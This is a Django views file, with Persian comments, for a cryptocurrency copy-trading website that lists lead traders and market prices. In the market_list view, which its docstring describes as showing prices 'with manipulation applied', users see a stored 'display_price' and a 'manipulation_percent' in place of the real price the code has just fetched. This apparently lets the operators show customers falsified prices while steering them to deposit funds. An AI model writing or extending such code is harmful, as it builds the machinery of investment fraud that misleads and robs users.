from django.shortcuts import render, redirect, get_object_or_404
from .models import *
from services.price_fetcher import CryptoPriceService
from django.contrib.auth.decorators import login_required
from django.contrib import messages

def copy_trading_dashboard(request):
    """نمایش لیست تریدرها و کارت‌های کپی‌تریدینگ"""
    traders = LeadTrader.objects.all()
    
    # برای بهینه‌سازی، فقط قیمت جفت‌ارزهای اصلی را بروزرسانی می‌کنیم
    pairs = TradingPair.objects.filter(is_active=True)
    for pair in pairs:
        try:
            current_real_price = CryptoPriceService.fetch_real_time_price(pair.symbol)
            if current_real_price > 0:
                pair.real_price = current_real_price
                pair.save()
        except Exception:
            pass # اگر اینترنت قطع بود، قیمت قبلی دیتابیس بماند

    context = {
        'traders': traders,
        'pairs': pairs,
        'page_title': 'Copy Trading Dashboard'
    }
    return render(request, 'trading/copy_trading.html', context)


def market_list(request):
    """نمایش جدول قیمت‌های بازار با اعمال دستکاری"""
    pairs = TradingPair.objects.filter(is_active=True)
    market_data = []
    
    for pair in pairs:
        try:
            real_price = CryptoPriceService.fetch_real_time_price(pair.symbol)
            if real_price > 0:
                pair.real_price = real_price
                pair.save()
        except Exception:
            pass

        market_data.append({
            'name': pair.display_name,
            'symbol': pair.symbol,
            'display_price': pair.display_price,
            'manipulation': pair.manipulation_percent
        })

    return render(request, 'trading/market.html', {'market_data': market_data, 'page_title': 'Crypto Markets'})

@login_required
def copy_action(request, trader_id):
    trader = get_object_or_404(LeadTrader, id=trader_id)
    
    # 1. Check Balance
    if request.user.balance < 10: 
        messages.error(request, f"Insufficient balance. Minimum $10 is required to copy {trader.name}.") # اصلاح شد
        return redirect('transactions:deposit')
    
    # 2. Check if already following
    already_following = FollowedTrader.objects.filter(user=request.user, trader=trader).exists()
    if already_following:
        messages.warning(request, f"You are already copying {trader.name}.") # اصلاح شد
        return redirect('accounts:dashboard')

    # 3. Create Follower Record
    FollowedTrader.objects.create(
        user=request.user, 
        trader=trader, 
        investment_amount=10
    )
    
    messages.success(request, f"Strategy copying for {trader.name} started successfully!") # اصلاح شد
    return redirect('accounts:dashboard')